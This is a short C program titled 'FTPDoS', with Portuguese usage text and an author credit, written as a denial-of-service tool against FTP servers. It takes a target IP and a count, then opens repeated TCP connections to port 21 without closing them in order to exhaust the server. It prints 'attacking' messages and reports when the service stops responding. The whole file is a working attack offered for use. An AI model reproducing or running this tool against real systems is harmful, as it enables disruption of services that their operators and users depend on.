#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{

	if(argc < 3)
	{

		printf("###########################################################\n");
		printf("#             FTPDoS - Script para DoS em FTP             #\n");
		printf("# ·Modo de uso:     ./ftpdos [IP] [QUANTIDADE DE PACOTES] #\n");
		printf("# ·Exemplo:         ./ftpdos 192.168.0.1 500              #\n");
		printf("#                                                         #\n");
		printf("# ·Autor:           Kripto-Sec (Jean)                     #\n");
		printf("###########################################################\n");

		return 0;

	} else
	{

		char *destino = argv[1];
		int sock, conexao, dos;

		int inicio = 0;
		int final = atoi(argv[2]);

		struct sockaddr_in alvo;

		for (dos = inicio + 1; dos <= final; dos++)
		{

			sock = socket(AF_INET, SOCK_STREAM, 0);
			alvo.sin_family = AF_INET;
			alvo.sin_addr.s_addr = inet_addr(destino);
			alvo.sin_port = htons(21);

			conexao = connect(sock, (struct sockaddr *)&alvo, sizeof alvo);

			if(conexao == 0)
			{

				printf("[*] Atacando! (Pacote %d/%d)\n", dos, final);

			} else
			{

				printf("[+] FTP parou de responder! (Pacote %d/%d)\n", dos, final);

			}

		}

		close(sock);
		close(conexao);

	}

	return 0;

}
